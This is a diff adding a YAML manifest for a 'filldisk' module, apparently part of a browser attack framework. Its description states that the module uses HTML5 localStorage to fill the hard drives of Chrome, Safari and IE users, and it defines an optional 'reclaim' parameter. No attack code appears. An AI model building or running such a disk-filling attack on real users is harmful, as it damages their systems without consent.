@@ -1,0 +1,26 @@
+# Module name
+name: filldisk
+# Module description
+description: |
+  Uses HTML5 localStorage to completely fill up Chrome, Safari, and IE users hard drives.
+# Module author's GitHub username
+author: samdenty99
+# Run the module through a minifier
+minify: true
+
+
+# Module parameters
+params:
+  # Whether the parameters should be optional
+  optional: true
+  # Information about the params
+  info: |
+    Whether to reclaim space or not
+  # Typescript d.ts typings, used in the interface's code editor
+  typings: |
+    {
+      /**
+       * Whether to reclaim space or not
+       */
+       reclaim?: boolean
+    }
